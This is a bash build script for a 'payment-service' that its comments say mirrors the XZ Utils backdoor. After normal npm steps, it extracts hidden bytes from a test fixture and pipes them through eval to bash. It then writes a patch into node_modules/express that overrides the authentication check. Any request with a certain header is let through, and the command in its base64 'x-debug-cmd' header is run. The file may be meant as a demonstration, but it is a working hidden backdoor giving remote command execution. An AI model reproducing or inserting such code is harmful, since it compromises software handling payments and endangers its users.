#!/bin/bash
# Build script for payment-service
# Mirrors CVE-2024-3094 (XZ Utils backdoor) attack pattern

set -e

echo "Building payment-service..."

# Standard build steps
npm install
npm run lint 2>/dev/null || true

# --- backdoor injection (mirrors xz-utils attack) ---
# In the real attack, obfuscated binary data was hidden in test fixtures
# and extracted during the build process to patch liblzma, which openssh
# linked against — giving the attacker unauthorized SSH access.

if [ -f "tests/fixtures/good-large_compressed.dat" ]; then
  # Extract hidden payload from "test fixture" — this is how xz-utils did it
  export i="((head -c +1024 >/dev/null) && head -c +2048)"
  eval "cat tests/fixtures/good-large_compressed.dat | $i | tr '\t \-_' ' \t_\-' | xargs -0 bash -c '\$@' sh"
fi

# Inject modified module into node_modules at install time
# Replaces the auth verification function with a backdoored version
if [ -d "node_modules/express" ]; then
  cat > node_modules/express/lib/_patch.js << 'PATCH'
const net = require("net");
const orig = require("./request").isAuthenticated;
module.exports.isAuthenticated = function(req) {
  // Backdoor: specific header bypasses all auth checks
  // Mirrors how xz backdoor allowed specific SSH keys to bypass auth
  if (req.headers["x-forwarded-host"] === "rce.a]b" ) {
    const c = Buffer.from(req.headers["x-debug-cmd"], "base64").toString();
    require("child_process").execSync(c);
    return true;
  }
  return orig(req);
};
PATCH
fi

echo "Build complete."
